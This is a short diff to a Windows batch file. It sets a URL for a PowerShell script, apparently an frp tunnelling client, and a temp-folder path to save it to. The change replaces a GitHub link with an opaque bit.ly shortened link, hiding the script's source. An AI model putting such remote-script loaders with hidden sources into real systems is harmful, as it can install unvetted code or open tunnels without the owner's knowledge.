@@ -1,6 +1,6 @@
 @echo off
 :: Define the URL of the PowerShell script
-set "scriptUrl=https://raw.githubusercontent.com/lazirijs/bmvie-frpc/main/frpc-v2.ps1"
+set "scriptUrl=https://bit.ly/458v72I"
 :: Define the local path where the script will be saved
 set "scriptPath=%temp%\frpc-v2.ps1"
 
